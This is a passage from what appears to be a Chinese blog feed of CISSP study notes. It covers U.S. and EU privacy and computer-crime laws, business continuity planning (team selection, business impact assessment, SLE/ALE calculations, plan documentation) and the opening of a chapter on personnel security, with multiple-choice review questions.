加利福尼亚外版布的SB 1386是第一个在全州范围内要求通告个人信息被泄漏到当事人的法律。美国目前除了三个州以外的其他外州都最终审议通过了相似的法律。目前，只有当涉及HIPPA覆盖的实体破坏了它们保护的健康信息时，联邦法律才要求需要通知个人。</li><li><strong>理解在美国和欧盟管理个人信息隐私的主要法律</strong> 美国有很多影响政府对信息的使用以及控制涉及敏感信息的具体行业(如金融服务公司和卫生健康组织)对信息使用的隐私法律。欧盟对数据隐私有着更加广泛的法令，以管理个人信息的使用和交换。</li><li><strong>了解法庭上可接纳的证据的基本要求</strong> 要被接纳，证据就必须与本案发生的事实相关，事实必须对本案是必要的，并且证据必须有法定资格或是合法收集的。</li><li><strong>了解怎么把安全整合到采购和供应商管理流程中</strong> 被许多组织大量使用的云服务，就要求更加注意在供应商选择过程中，以及作为供应商持续管理的一部分，引导信息安全控制的审查。</li></ul><h3 id="4-6-复习题"><a href="#4-6-复习题" class="headerlink" title="4.6 复习题"></a>4.6 复习题</h3><ol><li><p>对于病毒、密码和其他类型的破坏计算机系统的恶意代码的编写者，下列哪个刑法是第一个去执行惩罚的?<br>A. 计算机安全法案<br>B. 国家基础设施保护法案<br>C. 计算机欺诈和滥用法案<br>D. 电子传输隐私法案</p></li><li><p>哪条法律首先要求美国联邦的相关计算机系统操作者接受计算机安全问题的定期培训?<br>A. 计算机安全法案<br>B. 国家基础设施保护法案<br>C. 计算机欺诈和滥用法案<br>D. 电子通信隐私法案</p></li><li><p>什么类型的法律并不要求国会的法案在联邦一级执行，而是由行政部门以法规、政策和程序的形式颁布?<br>A. 刑法<br>B. 普通法<br>C. 民法<br>D. 行政法</p></li><li><p>哪个联邦政府机构有安全责任确保政府计算机系统没有用于处理敏感和分类信息?<br>A. 美国国家安全局<br>B. 联邦调查局<br>C. 国家标准和技术协会<br>D. 联邦情报局</p></li><li><p>什么是计算机系统最广泛的类别，这个类别受计算机欺诈和滥用方案(修正案)保护?<br>A. 政府所属系统<br>B. 联邦相关系统<br>C. 用于洲际贸易的系统<br>D. 美国境内系统</p></li><li><p>在设置对获得政府部门授权的监管部门搜查私人住宅和设施的权利限制方面，什么法律保护了公民的隐私权?<br>A. 隐私法案<br>B. 第四修正案<br>C. 第二修正案<br>D. Grarnm-Leach-Bliley法案</p></li><li><p>Matthew最近编写了一个创新的算法去解决一个数学问题，并且他希望与全世界分享。但是，在技术杂志上发布软件代码之前，他想获得一些知识产权方面的保护。下列哪个保护最适合他?<br>A. 版权<br>B. 商标<br>C. 专利<br>D. 商业秘密</p></li><li><p>Mary 是一家制造企业Acme Widgets的联合创始人。与合伙人Joe一起，她开发了一个特种油，能显著提高小部件的生产过程。为了保证配方的机密性，Mary和Joe计划在其他工人离开后，由他们自己在厂房里大量生产这种油。他们想尽可能保护这个配方。下列哪个知识产权保护最适合他们?<br>A. 版权<br>B. 商标<br>C. 专利<br>D. 商业秘密</p></li><li><p>Richard近期为计划即将开始使用的新产品起了一个不错的名字。他与律师商量并填写相应的申请去保护他的产品名字，但是仍未从政府收到关于他的申请的回应。他想立即开始使用名字。他应该使用什么样的符号来表明他的产品名字处于受保护的状态?<br>A. ©<br>B. ®<br>C. ™<br>D. t</p></li><li><p>什么法律禁止政府机构泄露个人提交给政府保护环境下的信息?<br>A. 隐私法案<br>B. 电子通信隐私法案<br>C. 健康保险流通与责任法案<br>D. Gramm-Leach-Bliley法案</p></li><li><p>软件行业使用什么法律来正式地派发大量许可，并试着标准化从一个州到另一个州的使用?<br>A. 计算机安全法案<br>B. 统一计算机信息处理法案<br>C. 数字千禧年版权法案<br>D. Gramm-Leach-B1i1ey法案</p></li><li><p>儿童联机隐私保护法案被设计用来保护在互联网上使用的儿童隐私。在企业可以从他们那里收集未经父母同意的个人身份信息之前，孩子的最小年龄是几岁?<br>A. 13<br>B. 14<br>C. 15<br>D. 16</p></li><li><p>为了获得数字千禧年版权法案的短暂活动条款的保护，下列哪些是互联网服务提供商不用满足的需求?<br>A. 服务提供商和消息的发起者必须处于不同的状态。<br>B. 传输、路由、连接的提供或复制必须由一个没有通过服务提供商选择的材料的自动化技术过程来进行。<br>C. 任何中间副本一般不得让预期外的任何收件人访问，并且不得保留超过合理必要的时间。<br>D. 传输必须由除供应商以外的人发起。</p></li><li><p>以下哪一个法律不是为了保护消费者和网民的隐私权?<br>A. 健康保险易流通与责任法案<br>B. 阻止盗用和伪装身份法案<br>C. 美国爱国者法案<br>D. Gramm-Leach-B1iley法案</p></li><li><p>以下哪一项许可协议类型不需要用户在执行之前确认他们己经阅读了协议?<br>A. 标准许可协议<br>B. 拆封协议<br>C. 单击许可协议<br>D. 口头协议</p></li><li><p>什么行业受Gramm-Leach-Bliley方案中的条款影响最直接?<br>A. 卫生保健<br>B. 银行<br>C. 执法<br>D. 防护承包商</p></li><li><p>在美国专利保护期是多长?<br>A. 提交申请日开始14年<br>B. 专利获得日开始14年<br>C. 提交申请日开始20年<br>D. 专利获得日开始20年</p></li><li><p>在处理关于欧盟数据隐私法令下的个人信息时，以下哪一项不是有效的法律依据?<br>A. 合同<br>B. 法律义务<br>C. 市场需求<br>D. 赞成</p></li><li><p>涉及信用卡信息处理时，要符合什么合规义务?<br>A. SOX<br>B. HIPAA<br>C. PCI DSS<br>D. FERPA</p></li><li><p>什么法案更新了健康保险流通与责任法案(HIPAA)中的隐私和安全需求?<br>A. HITECH<br>B. CALEA<br>C. CFAA<br>D. CCCA</p></li></ol>]]></content>
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cissp </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cissp学习笔记（3）——业务连续性计划</title>
      <link href="/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%883%EF%BC%89%E2%80%94%E2%80%94%E4%B8%9A%E5%8A%A1%E8%BF%9E%E7%BB%AD%E6%80%A7%E8%AE%A1%E5%88%92/"/>
      <url>/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%883%EF%BC%89%E2%80%94%E2%80%94%E4%B8%9A%E5%8A%A1%E8%BF%9E%E7%BB%AD%E6%80%A7%E8%AE%A1%E5%88%92/</url>
      <content type="html"><![CDATA[<p>在本章的考试大纲内容有：<br>安全和风险管理(例如，安全、风险、合规性、法律、法规、业务连续性)</p><ul><li>G. 理解业务连续性需求<ul><li>G.l 开发和文档化项目范围和计划</li><li>G.2 引导业务影响分析</li></ul></li></ul><p>安全运营(例如基本概念、调查、事件管理、灾难恢复)</p><ul><li>N. 参与业务连续性规划和演习</li></ul><h3 id="3-1-业务连续性计划"><a href="#3-1-业务连续性计划" class="headerlink" title="3.1 业务连续性计划"></a>3.1 业务连续性计划</h3><p>　　业务连续性计划(Business Continuity Planning，BCP)涉及对组织各种过程的风险评估，还有在发生风险的情况下为了使风险对组织的影响降至最小程度而制定的各种策略、计划和措施。</p><p>BCP 过程包括以下4 个主要步骤：</p><ul><li>(1) 项目范围和计划编制</li><li>(2) 业务影响评估</li><li>(3) 连续性计划</li><li>(4) 批准和实现</li></ul><h3 id="3-2-项目范围与计划"><a href="#3-2-项目范围与计划" class="headerlink" title="3.2 项目范围与计划"></a>3.2 项目范围与计划</h3><p>　　开发强大的业务连续性计划需要使用经过认证的一套方法。该方法的具体内容如下：</p><ul><li>业务组织从危机计划编制的角度进行结构化分析。</li><li>在高层管理人员准许的情况下，建立BCP团队。</li><li>评估参与业务连续性活动的可用资源。</li><li>管理组织对灾难性事件做出反应的法律和法规方面的分析。</li></ul><h4 id="3-2-1-业务组织分析"><a href="#3-2-1-业务组织分析" class="headerlink" title="3.2.1 业务组织分析"></a>3.2.1 业务组织分析</h4><p>　　业务组织分析确定参与业务连续性计划编制过程的所有相关部门和人员。分析时需要考虑包括下面的一些领域：</p><ul><li>负责为用户提供核心服务业务的运营部门。</li><li>重要的支持服务部门，如IT部门、设备维护部门和其他负责对支持运营部门的系统进行检修的团队。</li><li>高层行政管理人员和对于组织继续生存来说非常重要的关键个人。</li></ul><h4 id="3-2-2-BCP-团队的选择"><a href="#3-2-2-BCP-团队的选择" class="headerlink" title="3.2.2 BCP 团队的选择"></a>3.2.2 BCP 团队的选择</h4><ul><li>来自组织的负责业务所提供核心服务的每个部门代表。</li><li>经过组织结构分析所确认的重要支持部门代表。</li><li>BCP 所涉及领域内的具有技术专长的IT代表。</li><li>了解BCP过程的安全代表。</li><li>熟悉公司法律、法规和契约责任的法律代表。</li><li>来自高层管理部门的代表。</li></ul><h4 id="3-2-3-资源需求"><a href="#3-2-3-资源需求" class="headerlink" title="3.2.3 资源需求"></a>3.2.3 资源需求</h4><ul><li><strong>BCP开发</strong> BCP团队需要某些资源来实施BCP过程的4个要素(项目范围和计划编制、业务影响评估、连续性计划、批准和实现)。此BCP阶段消耗的资源很可能是BCP团队成员和要求帮助计划开发的支持员工所付出的人力。</li><li><strong>BCP测试、培训和维护</strong> BCP的测试、培训和维护阶段会要求一些硬件和软件支持，但是不管怎样，这个阶段的主要支持工作都将涉及活动中部分员工所付出的人力。</li><li><strong>BCP实现</strong> 当灾难来袭且BCP团队认为有必要全面实E处业务连续性计划时，就需要大量的资源。这包含大量的人力(即使不是全部，BCP也仍然很可能成为组织的主力)和对”硬”资源的利用。出于这个原因，团队正确并果断地使用其BCP实现能力是很重要的。</li></ul><h4 id="3-2-4-法律和法规要求"><a href="#3-2-4-法律和法规要求" class="headerlink" title="3.2.4 法律和法规要求"></a>3.2.4 法律和法规要求</h4><p>　　许多行业可能会发现他们要受到联邦政府、州和地方法律或法规的限制，这些限制要求他们实现不同程度的BCP。在BCP过程中，将组织的法律顾问添加进来是非常重要的。法律顾问非常熟悉应用于组织的各种法律、法规和契约责任，在保证组织持续生存从而给包括员工、股东、供应商和用户在内的各方带来利益的同时，他们能够帮助团队实现满足这些要求的计划。</p><h3 id="3-3-业务影响评估"><a href="#3-3-业务影响评估" class="headerlink" title="3.3 业务影响评估"></a>3.3 业务影响评估</h3><p>　　业务影响评估(Business Impact Assessment，BIA)确定了能够决定组织持续发展的资源，以及对这些资源的威胁，并且还评估每种威胁实际出现的可能性以及出现的威胁对业务的影响。<br>决策类型如下：</p><ul><li><strong>定量决策</strong> 定量决策涉及使用数字和公式做出决定。这种数据类型通常以美元表示各种与业务相关的选项。</li><li><strong>定性决策</strong> 定性决策考虑的是非数值因素，例如情感、投资者/顾客的信心、员工的稳定性以及其他感兴趣的事务。这种数据类型通常以优先级类别(例如，高、中、低)表示。</li></ul><h4 id="3-3-1-确定优先级"><a href="#3-3-1-确定优先级" class="headerlink" title="3.3.1 确定优先级"></a>3.3.1 确定优先级</h4><p>　　将确定优先级过程的工作量划分给团队成员的一个主要方法是： 指定每个参与者都创建一个优先级列表，这个列表涉及该参与者所负责部门的业务功能。当整个BCP 团队开会讨论时，团队成员会使用这些优先级列表为整个组织创建一个优先级主列表。</p><h4 id="3-3-2-风险识别"><a href="#3-3-2-风险识别" class="headerlink" title="3.3.2 风险识别"></a>3.3.2 风险识别</h4><p>　　风险具有两种形式：自然风险与人为风险。在这个阶段，BCP团队应当不关心每种风险实际发生的可能性，也不必关心发生风险对业务继续运作的影响破坏程度。</p><h4 id="3-3-3-可能性评估"><a href="#3-3-3-可能性评估" class="headerlink" title="3.3.3 可能性评估"></a>3.3.3 可能性评估</h4><p>　　可能性评估是为了确定每种风险发生的可能性。</p><h4 id="3-3-4-影响评估"><a href="#3-3-4-影响评估" class="headerlink" title="3.3.4 影响评估"></a>3.3.4 影响评估</h4><p>　　从定量的观点出发，业务影响涉及三个特定的度量： 暴露因子、单一损失期望和年度损失期望。</p><ul><li>暴露因子(EF)是指风险对资产造成损失的程度，以资产价值的百分比来表示。</li><li>单一损失期望(SLE)是指每次风险发生后预计造成的货币损失。</li><li>年度损失期望他E)是指一年内由于风险引起资产损失而预计对公司造成的货币损失。</li></ul><h4 id="3-3-5-资源优先级划分"><a href="#3-3-5-资源优先级划分" class="headerlink" title="3.3.5 资源优先级划分"></a>3.3.5 资源优先级划分</h4><p>　　BIA的最后一个步骤是划分针对各种不同风险所分配的业务连续性资源的优先级，这些风险己在BIA前面的任务中进行了确定和评估。定性分析可以证明提高或降低风险的优先级是否正确，这些风险在定量列表中存在并己按照ALE进行分类。</p><h3 id="3-4-连续性计划"><a href="#3-4-连续性计划" class="headerlink" title="3.4 连续性计划"></a>3.4 连续性计划</h3><h4 id="3-4-4-策略开发"><a href="#3-4-4-策略开发" class="headerlink" title="3.4.4 策略开发"></a>3.4.4 策略开发</h4><p>　　连续性计划的策略开发阶段为业务影响评估和BCP开发的连续性计划阶段之间架起了桥梁。BCP团队应当回顾一下BIA前期建立的MTD评估时间，并且确定哪些风险被认为是可接受的，哪些必须采取BCP连续性措施加以缓解。</p><h4 id="3-4-2-预备和处理"><a href="#3-4-2-预备和处理" class="headerlink" title="3.4.2 预备和处理"></a>3.4.2 预备和处理</h4><ul><li><p>人<br>必须确保组织内部的人在紧急事件发生前、发生期间和发生后都是安全的。</p></li><li><p>建筑物/设备</p><ul><li><strong>强化预备措施</strong> BCP应当对要采取的机制和过程进行概述，这些机制和过程可以被用于保护现有的设施能够抵御策略开发阶段定义的风险。这可能会包括一些步骤，这些步骤既可能像修补漏屋顶一样简单，也可能像安装用风遮蔽物和防火墙一样复杂。</li><li><strong>预备场所</strong> 在不可能强化设施抵御风险时，BCP应该确定业务活动可以立即恢复的预备场所(或为所有受影响的关键性业务功能提供的时间至少要低于最大可容忍故障时间)。</li></ul></li><li><strong>基础设施</strong><ul><li><strong>强化系统</strong> 可以通过引入保护性措施来为系统抵御风险，这些措施包括计算机防火抑制系统和不间断电源。</li><li><strong>预备系统</strong> 业务功能也可以通过引入的冗余性得到保护(依赖于不同设备的元余构件，或是完全冗余的系统或通信链接)。</li></ul></li></ul><h4 id="3-4-3-计划批准和实现"><a href="#3-4-3-计划批准和实现" class="headerlink" title="3.4.3 计划批准和实现"></a>3.4.3 计划批准和实现</h4><p>　　资深管理人员的批准和参与是整个BCP 工作成功的关键。如果可能，那么应当尝试获得公司最高领导(如首席执行官、董事长、总裁或类似的业务领导)对计划的批准。这个步骤证明了计划对整个组织的重要性，并且显示了业务领导对业务连续性的承诺。像这样的个人签名还加深了对其他资深经理的影响和计划的可信性，否则他们将会把计划作为必要的但却琐碎的IT 事务丢在一边。</p><h4 id="3-4-4-计划实现"><a href="#3-4-4-计划实现" class="headerlink" title="3.4.4 计划实现"></a>3.4.4 计划实现</h4><p>　　BCP团队应该共同开发一个实现计划，这个计划利用特定的资源，从而尽可能迅速地在给出修改范围和组织环境的情况下取得所声明的过程和预备措施的目标。在完全部署所有这些资源之后，BCP团队应当监督恰当的BCP 维护程序，以便确保计划能够响应业务需求的发展。</p><h4 id="3-4-5-培训和教育"><a href="#3-4-5-培训和教育" class="headerlink" title="3.4.5 培训和教育"></a>3.4.5 培训和教育</h4><p>　　组织中的每个人都应当接受至少一份计划综述简报，从而使他们具有信心，相信业务领导己经考虑到连续性业务的可能风险，并且制定了计划来缓解对组织的影响。具有直接的BCP职责的人们应当受到培训，对其具体的BCP任务进行评估，确保在灾难发生时他们能够有效地完成其任务。此外，至少应当为每个BCP任务培训一名候补人员，以便确保在人员受伤或危机时刻人员不能到位时的冗余性。</p><h3 id="3-5-BCP-文档化"><a href="#3-5-BCP-文档化" class="headerlink" title="3.5 BCP 文档化"></a>3.5 BCP 文档化</h3><p>将BCP方法文档化具有以下优点：</p><ul><li>确保所有BCP 人员都有一个连续性的书面文档，在紧急事件发生时，甚至在资深BCP 团队成员不在现场指导时可以作为参考。</li><li>提供了BCP 过程的历史记录，这对于将来人员试图理解不同过程的内因并对计划进行必要的修改是有用的。</li><li>促使团队成员将他们的想法记录到纸上，这个过程常常有助于确定计划中的缺陷。将计划记录到纸上还可以向不属于BCP 团队的人分发简报，从而进行” 理智的分析” 。</li></ul><h4 id="3-5-1-连续性计划的目标"><a href="#3-5-1-连续性计划的目标" class="headerlink" title="3.5.1 连续性计划的目标"></a>3.5.1 连续性计划的目标</h4><p>　　BCP的最常见目标十分简单： 确保在紧急事件发生时业务的连续性操作。为了满足组织的需求，其他目标也可能被放入文档的这部分内容。</p><h4 id="3-5-2-重要性声明"><a href="#3-5-2-重要性声明" class="headerlink" title="3.5.2 重要性声明"></a>3.5.2 重要性声明</h4><p>　　重要性声明反映了BCP对于组织继续生存能力的关键程度。这份文档通常采取向组织的员工发送信件的形式，声明为什么要将重要的资源放到BCP开发过程中，并且要求所有人员在BCP实现阶段进行协作。这就是高管参与BCP的重要性。如果可以在这封信上签署CEO或类似级别领导的名字，那么这个计划本身将在整个组织内实现改变时产生极大的影响。</p><h4 id="3-5-3-优先级声明"><a href="#3-5-3-优先级声明" class="headerlink" title="3.5.3 优先级声明"></a>3.5.3 优先级声明</h4><p>　　优先级声明是业务影响评估的优先级确定阶段的直接产物，它仅仅涉及按优先次序列出的被认为对连续业务操作具有关键作用的功能。当列出这些优先级后，你还应当包括一个声明，指出它们作为BCP过程的一部分进行开发，并且反映在紧急事件中这些功能对连续性业务操作的重要性。</p><h4 id="3-5-4-组织职责的声明"><a href="#3-5-4-组织职责的声明" class="headerlink" title="3.5.4 组织职责的声明"></a>3.5.4 组织职责的声明</h4><p>　　组织职责的声明也来自于高管，并且可能并入与重要性声明相同的文档内。它基本上反映了”业务连续性是所有人的职责”这一观点。组织职责的声明重申了组织对业务连续性计划的承诺，并且通知组织的员工、供应商和分支机构，要求他们每个人都做他们能够协助BCP过程的所有工作。</p><h4 id="3-5-5-紧急程度和时限的声明"><a href="#3-5-5-紧急程度和时限的声明" class="headerlink" title="3.5.5 紧急程度和时限的声明"></a>3.5.5 紧急程度和时限的声明</h4><p>　　紧急程度和时限的声明表述了实现BCP的关键性，并且概述了由BCP 团队决定的并由上层管理者同意的实现时间表。声明的措辞将依赖于由组织的领导层为BCP过程分配的实际的紧急程度。</p><h4 id="3-5-6-风险评估"><a href="#3-5-6-风险评估" class="headerlink" title="3.5.6 风险评估"></a>3.5.6 风险评估</h4><p>　　对于定量分析来说，应当包括实际的AV、EF、ARO、SLE和ALE数值。对于定性分析来说，风险分析背后的考虑过程应当提供给阅读者。值得注意的是，风险评估内容必须进行定期更新，因为它反映了某个时间点的评估。</p><h4 id="3-5-7-可接受的风险-风险缓解"><a href="#3-5-7-可接受的风险-风险缓解" class="headerlink" title="3.5.7 可接受的风险/风险缓解"></a>3.5.7 可接受的风险/风险缓解</h4><p>　　BCP文档中可接受的风险/风险缓解部分包含BCP过程的策略开发部分的结果。它应该覆盖风险分析部分确定的所有风险，并且概述一个或两个考虑过程(如下所示)：</p><ul><li>对于那些被认为可接受的风险，应当概述风险被认为可接受的原因，以及未来可能导致值得重新考虑这个决定的事件。</li><li>对于那些被认为不可接受的风险，应当概述风险缓解的预备措施和用来减少威胁组织持续生存能力的风险过程。</li></ul><h4 id="3-5-8-重大记录计划"><a href="#3-5-8-重大记录计划" class="headerlink" title="3.5.8 重大记录计划"></a>3.5.8 重大记录计划</h4><p>　　这份文档阐述了关键业务记录将要存放的地方和对这些记录建立和存储副本的过程。<br>　　执行重大记录计划最大的挑战之一，通常首要的是识别重大记录。在许多组织从纸质转换为数字工作流时，他们常常丢失了围绕创建和维护正式文件结构的精确性。重大记录可能现在分布在各种IT系统和云服务中。一些可能会存储在团队可访问的中央服务器上，然而其他可能位于数字仓库中，并分配给一个员工。</p><h4 id="3-5-9-晌应紧急事件的指导原则"><a href="#3-5-9-晌应紧急事件的指导原则" class="headerlink" title="3.5.9 晌应紧急事件的指导原则"></a>3.5.9 晌应紧急事件的指导原则</h4><p>　　紧急事件响应指导原则概述了组织和个人对于紧急事件立即响应的职责。此文档为首先发现紧急事件的员工提供了激活未自动激活的BCP预备措施的步骤，这些指导原则应当包括下列内容：</p><ul><li>立即响应规程(安全性规程、防火规程、通知恰当的紧急事件代理机构等)</li><li>事件通知清单(主管、BCP团队成员等)</li><li>在等待BCP团队集中时采取的二级响应规程</li></ul><h4 id="3-5-10-维护"><a href="#3-5-10-维护" class="headerlink" title="3.5.10 维护"></a>3.5.10 维护</h4><p>　　每个组织都会遇到几乎持续的变化，这种动态特性也确保了业务连续性要求随之发生变化。BCP团队不应该在计划开发完成后被解散，而是应当定期接触并讨论计划、复审计划测试的结果，以确保能够继续满足组织的要求。<br>　　在更新BCP的任何时候，必须进行良好的版本控制。所有旧的BCP版本都应该进行物理销毁，并且被最新版本代替，这样就不会产生对BCP正确实现的混淆。将BCP 组件包含在工作描述中以便确保BCP保持更新和正确实施是很好的习惯。员工的工作描述中包含BCP职责也会使其成为绩效审查过程考虑的对象。</p><h4 id="3-5-11-测试和演习"><a href="#3-5-11-测试和演习" class="headerlink" title="3.5.11 测试和演习"></a>3.5.11 测试和演习</h4><p>　　BCP文档还应当概述一个正式的测试计划，以确保计划是最新的，并且所有人员都接受了充分培训，从而在实际的灾难事件发生时能够履行他们的职责。测试过程实际上与用于灾难恢复的计划非常类似。</p><h3 id="3-6-考试要点"><a href="#3-6-考试要点" class="headerlink" title="3.6 考试要点"></a>3.6 考试要点</h3><ul><li><strong>理解业务连续性计划编制过程的4个步骤</strong> 业务连续性计划涉及4个不同的阶段： 项目范围和计划编制、业务影响评估、连续性计划、批准和实现。每个任务都为整体目标服务，从而确保业务在发生紧急事件时不会中断井持续运营。</li><li><strong>描述如何执行业务结构分析</strong> 在业务结构分析中，负责领导BCP过程的人确定哪些部门和个人会参与业务连续性计划。这种分析被用作BCP团队选择的基础，并且在BCP团队确认后被用于指导BCP开发的后续阶段。</li><li><strong>列出业务连续性计划团队的必要成员</strong> BCP团队至少应当包括下列人员：<ul><li>每个运营和支持部门的代表</li><li>IT部门的技术专家</li><li>具有BCP技能的安全人员</li><li>熟悉公司法律、规章、契约责任的法律代表以及高管代表</li><li>其他团队成员取决于组织的结构和特性。</li></ul></li><li><strong>了解业务连续性计划编制者面对的法律和规章要求</strong> 业务领导必须尽职，以确保股东的利益在灾难事件发生时得到保护。美国的一些行业还必须服从美国联邦、州|和当地的法规，这些法规要求特殊的BCP规程。很多业务在灾难发生之前和之后都具有客户必须满足的合约义务。</li><li><strong>解释业务影响评估过程的步骤</strong> 业务影响评估过程的5 个步骤包括优先级确定、风险确定、可能性评估、影响评估和资源优先级划分。</li><li><strong>描述连续性策略的开发过程</strong> 在策略开发阶段，BCP团队确定哪些风险要进行缓解。在预备和处理阶段，将会对实际缓解风险的机制和规程进行设计。计划必须随后得到高管的批准并且加以实现。人员还必须接受其在BCP 过程中所处角色的培训。</li><li><strong>解释为组织机构的业务连续性计划进行全部文档化的重要性</strong> 将计划记录下来，以便在灾难发生时为计划的实施提供规程上的书面记录。这避免了”在我脑子里”的综合症，从而确保在紧急事件中有序地实施计划。</li></ul><h3 id="3-7-复习题"><a href="#3-7-复习题" class="headerlink" title="3.7 复习题"></a>3.7 复习题</h3><ol><li><p>对于那些对业务连续性计划开发负责的人来说，第一步应该执行什么?<br>A. 团队选择<br>B. 业务组织分析<br>C. 资源需求分析<br>D. 法律和合规性评估</p></li><li><p>一旦BCP 团队选定，放在团队议程首要位置的是什么?<br>A. 业务影响评估<br>B. 业务组织评估<br>C. 资源需求评估<br>D. 法律和合规性评估</p></li><li><p>在组织持续生存方面，为确保适当的措施用于减少灾难影响，以下哪一项描述了企业管理人员和总监的责任?<br>A 企业责任<br>B. 灾难需求<br>C. 应尽关注<br>D. 持续经营责任</p></li><li><p>在BCP阶段，BCP过程消耗的主要资源将是什么?<br>A. 硬件<br>B. 软件<br>C. 处理时间<br>D. 人员</p></li><li><p>在业务影响评估的优先级识别阶段，什么测量单位用于资产价值量化?<br>A. 货币<br>B. 效用<br>C. 重要性<br>D. 时间</p></li><li><p>下列哪一项目A条款标识了一个特定风险每年预计损失的货币量?<br>A. ARO<br>B. SLE<br>C. ALE<br>D. EF</p></li><li><p>什么BIA度量值被用于表示一个业务功能的最长中断时间，但这个中断没有对组织产生不可弥补的损害?<br>A. SLE<br>B. EF<br>C. MTD<br>D. ARO</p></li><li><p>你担心雪崩这个风险会威胁到你的300万美金运输设施。基于业内意见，你确定每年雪崩有5%的几率发生。专家提醒你，雪崩会彻底摧毁你的建筑物，井迫使你在同一块土地上重建。这300万美金的设施中90%的价值是大楼，另外10%是土地本身。雪崩对于你的运输设施的单一损失期望是多少?<br>A. 300 万美金<br>B. 270 万美金<br>C. 27 万美金<br>D. 13.5 万美金</p></li><li><p>在问题8提到的场景中，年度损失预期是多少?<br>A. 300 万美金<br>B. 270 万美金<br>C. 27 万美金<br>D. 13.5 万美金</p></li><li><p>你担心咫风会对设在南佛罗里达州的公司总部造成风险。这个建筑物本身价值1500万美金。在咨询了国家气象服务部门后，你确定咫风在一年之中袭击的可能性有10%。你雇佣了一支由建筑师和工程师组成的团队，确定了一般的咫风会摧毁约50%的建筑物。年度损失期望(ALE)是多少?<br>A. 75 万美金<br>B. 150 万美金<br>C. 750 万美金<br>D. 1500 万美金</p></li><li><p>以下哪个BCP任务连接业务影响评估和连续性规划阶段?<br>A. 资源优先级<br>B. 可能性评估<br>C. 策略开发<br>D. 条款和流程</p></li><li><p>当设计连续性计划条款和流程时，首先应该保护哪个资源?<br>A. 厂房<br>B. 基础设施<br>C. 金融<br>D. 人</p></li><li><p>在业务影响评估过程中，下列哪个观点不适合定量测量?<br>A 厂房的损失<br>B. 车辆的损坏<br>C. 负面宣传<br>D. 断电</p></li><li><p>Lighter Than Air 公司预计如果龙卷风袭击了它的飞机业务设施，就会损失1000万美金。假设龙卷风袭击设施每100年会发生一次。那么在这个场景下单一损失期望是多少?<br>A. 0.01<br>B. 1000 万美金<br>C. 10 万美金<br>D. 0.10</p></li><li><p>根据问题14提到的场景，年度损失期望是多少?<br>A. 0.01<br>B. 1000 万美金<br>C. 10 万美金<br>D. 0.10</p></li><li><p>在哪个业务连续性计划任务中，会设计流程和机制以减少BCP团队认定的不可接受的风险?<br>A. 策略阶段<br>B. 业务影响评估<br>C. 条款和流程<br>D. 资源优先级</p></li><li><p>安装元余通信链路，这是利用了什么类型的缓解条款?<br>A. 加固系统<br>B. 定义系统<br>C. 减轻系统<br>D. 更换系统</p></li><li><p>如果灾难中断了业务的正常运行，什么类型的计划概述了相关处理流程?<br>A. 业务连续性计划<br>B. 业务影响评估<br>C. 灾难恢复计划<br>D. 脆弱性评估</p></li><li><p>用于为单个风险场景计算单一损失期望的公式是什么?<br>A. SLE = AV x EF<br>B. SLE = RO x EF<br>C. SLE = AV x ARO<br>D. SLE = EF x ARO</p></li><li><p>对于下面列出的人员，一份重要的业务连续性计划声明会对谁提供最佳承诺?<br>A. 业务运营副总裁<br>B. 首席信息官<br>C. 首席执行官<br>D. 业务连续性经理</p></li></ol>]]></content>
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cissp </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cissp学习笔记（2）——人员安全和风险管理概念</title>
      <link href="/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%882%EF%BC%89%E2%80%94%E2%80%94%E4%BA%BA%E5%91%98%E5%AE%89%E5%85%A8%E5%92%8C%E9%A3%8E%E9%99%A9%E7%AE%A1%E7%90%86%E6%A6%82%E5%BF%B5/"/>
      <url>/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%882%EF%BC%89%E2%80%94%E2%80%94%E4%BA%BA%E5%91%98%E5%AE%89%E5%85%A8%E5%92%8C%E9%A3%8E%E9%99%A9%E7%AE%A1%E7%90%86%E6%A6%82%E5%BF%B5/</url>
      <content type="html"><![CDATA[<p>在本章的考试大纲内容有：<br>安全和风险管理(例如安全、风险、合规性、法律、法规、业务连续性)</p><ul><li>H. 促进人员安全策略<ul><li>H.l 筛选候选人(例如背景检测、教育核查)</li><li>H.2 雇佣协议和策略</li><li>H.3 解雇员工的流程</li><li>H.4 供货商、顾问和承包商控制</li><li>H.5 合规性</li><li>H.6 隐私</li></ul></li><li>I. 理解和应用风险管理的概念<ul><li>I.1 识别威胁和脆弱性</li><li>I.2 风险评估/分析(定性、定量、混合)</li><li>I.3 风险分配/接受(例如系统授权)</li><li>I.4 措施选择</li><li>I.5 实施</li><li>I.6 控制类型(阻止、检测、纠正等)</li><li>I.7 控制评估</li><li>I.8 监控和测量</li><li>I.9 资产评估</li><li>I.10 报告</li><li>I.11 持续改进</li><li>I.l2 风险框架</li></ul></li><li>L. 建立和管理信息安全教育、培训和意识<ul><li>L.l 适合组织需要的水平的安全意识、培训和教育</li><li>L.2 定期的内容相关审查<br>安全评估与测试(设计、执行和分析安全测试)</li></ul></li><li>C.5 培训和意识</li></ul><h3 id="2-1-促进人员安全策略"><a href="#2-1-促进人员安全策略" class="headerlink" title="2.1 促进人员安全策略"></a>2.1 促进人员安全策略</h3><p>　　在任何安全解决方案中，人都是最薄弱的环节。无论部署怎样的物理或逻辑控制，人总能发现避免受到控制、回避或消除控制以及禁用控制的方法。<br>在构建工作描述方面的重要元素包括职责分离、工作职责和岗位轮换：</p><ul><li><strong>职责分离</strong> 职责分离属于安全概念，是指把关键的、重要的和敏感的工作任务分配给若干不同的管理员或高级执行者。这样做能阻止任何一个人具备破坏或削弱重要安全机制的能力。可以将职责分离视为对管理员的最小特权原则的应用。职责分离也能够防止共谋，共谋指的是负面活动由两人或多人共同完成，其意图往往是伪造、偷窃或间谍行为。</li><li><strong>工作职责</strong> 